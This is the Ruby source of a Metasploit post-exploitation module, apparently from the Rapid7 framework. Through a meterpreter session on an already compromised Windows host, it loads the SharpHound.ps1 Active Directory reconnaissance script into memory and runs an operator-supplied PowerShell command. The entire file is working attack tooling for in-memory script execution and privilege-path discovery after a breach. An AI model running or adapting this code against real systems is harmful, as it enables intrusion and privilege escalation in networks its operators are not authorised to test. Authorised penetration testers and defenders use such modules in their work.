##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::Windows::Powershell
  include Msf::Post::Windows::Priv
  include Msf::Post::Common

  def initialize(info = {})
    super(update_info(
      info,
      'Name' => 'BloodHound',
      'Description' => %q(This module load in memory Invoke-BloodHound.ps1 and executes it.),
      'License' => MSF_LICENSE,
      'Author' => [
        'BloodHound Gang', # Invoke-BloodHound
        'phra' # MSF Module
      ],
      'References' => [ 'https://github.com/BloodHoundAD/BloodHound' ],
      'Platform' => [ 'win' ],
      'Arch' => [ 'x86', 'x64' ],
      'SessionTypes' => [ 'meterpreter' ]
    )
  )

    register_options(
      [
        OptString.new('CMD', [ true, 'The command to execute (eg. Invoke-BloodHound)', 'Get-Help Invoke-BloodHound' ])
      ]
    )
  end

  def run
    if have_powershell?
      vprint_good('PowerShell is installed.')
    else
      print_error('PowerShell is not installed! STOPPING')
      return
    end

    client.core.use "powershell"

    print_status("Importing: Invoke-BloodHound")

    opts = {
      file: File.expand_path(File.join(Msf::Config.data_directory, "post", "powershell", "SharpHound.ps1"))
    }

    client.powershell.import_file(opts)
    print_good("Imported: Invoke-BloodHound")
    print_status("Executing: #{datastore['cmd']}")

    opts = {
      code: datastore['cmd']
    }

    result = client.powershell.execute_string(opts)
    print_good("Command execution completed:\n#{result}")
  end
end
